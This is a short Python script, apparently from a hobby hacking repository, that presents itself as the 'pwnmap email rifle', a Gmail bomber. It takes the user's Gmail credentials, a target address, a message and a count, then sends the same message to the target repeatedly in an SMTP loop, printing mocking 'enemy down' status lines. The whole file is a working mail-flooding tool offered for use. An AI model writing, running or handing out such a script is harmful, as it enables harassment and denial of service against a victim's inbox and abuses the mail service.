import os
import sys
import getpass
import smtplib

BLUE = '\33[94m'
LightBlue = '\033[94m'
RED = '\033[91m'
WHITE = '\33[97m'
YELLOW = '\33[93m'
GREEN = '\033[32m'
LightCyan    = "\033[96m"
END = '\033[0m'

if len(sys.argv) < 2:
    os.system("clear || cls")
    sys.stdout.write(RED + """
                                               
                                             
  _ ____      ___ __  _ __ ___   __ _ _ __   
 | '_ \ \ /\ / / '_ \| '_ ` _ \ / _` | '_ \  
 | |_) \ V  V /| | | | | | | | | (_| | |_) | 
 | .__/ \_/\_/ |_| |_|_| |_| |_|\__,_| .__/  
 | |                                 | |     
 |_|                                 |_|     
                                                                                                                                                                          
                                                                                                                                                                          
                                                                                                                                                                          6

    """  + END+BLUE+'pwnmap email rifle (USE AT YOUR OWN RISK, THERE ARENT PROXIES ON THIS NOR ANY PROPER OBFUSCATION)'.format(RED, END).center(69) +
    '\n' + '\tGmail bomber by {}pwnmap'.format(YELLOW, RED, YELLOW, BLUE).center(76) +
    '\n' + '\tpwnmaps greatest weapon ever since the pope existed\n'.format(YELLOW).center(80) +
    '\n' + '\tversion: {}69420.69{}\n'.format(YELLOW, END).center(80) + '\n')
else:
    sys.exit('Usage: python gmail.py')
    os.system("clear || cls")

email = input(LightCyan+'[?] '+YELLOW+'your shitty email : '+RED)
pswd = input(LightCyan+'[?] '+YELLOW+'your password (i cant steal it bro check src) : '+RED)
vemail = input(LightCyan+'[?] '+YELLOW+'who are you aiming said rifle at : '+RED)
subject = input(LightCyan+'[?] '+YELLOW+'subject/title : '+RED)
message = input(LightCyan+'[?] '+YELLOW+'your bullets ingredients - message : '+RED)
count = int(input(LightCyan+'[?] '+YELLOW+' how many rounds are you firing : '+RED))
print()
smtp_server = 'smtp.gmail.com'
port = 587
server = smtplib.SMTP(smtp_server,port)
server.ehlo()
if smtp_server == "smtp.gmail.com":
        server.starttls()
server.login(email,pswd)
i = 0
print(LightCyan+'[*] '+YELLOW+' opening fire.... \n')
while i < count:
    i+=1
    server.sendmail(email,vemail,message)
    if i == 1:
        print (LightCyan+'[pwnmap status report] '+YELLOW+' %dst email rifle has been fired: enemy down. ' %(i))
    elif i == 2:
        print (LightCyan+'[pwnmap status report] '+YELLOW+' %dnd email rifle has been fired: enemy down. ' %(i))
    elif i == 3:
        print (LightCyan+'[pwnmap status report] '+YELLOW+' %drd email rifle has been fired: enemy down. ' %(i))
    else:
        print (LightCyan+'[pwnmap status report] '+YELLOW+' %dth email rifle has been fired: enemy down. ' %(i))
    sys.stdout.flush()
server.quit()
print(LightCyan+'[pwnmap status report] '+YELLOW+'All done'+END)


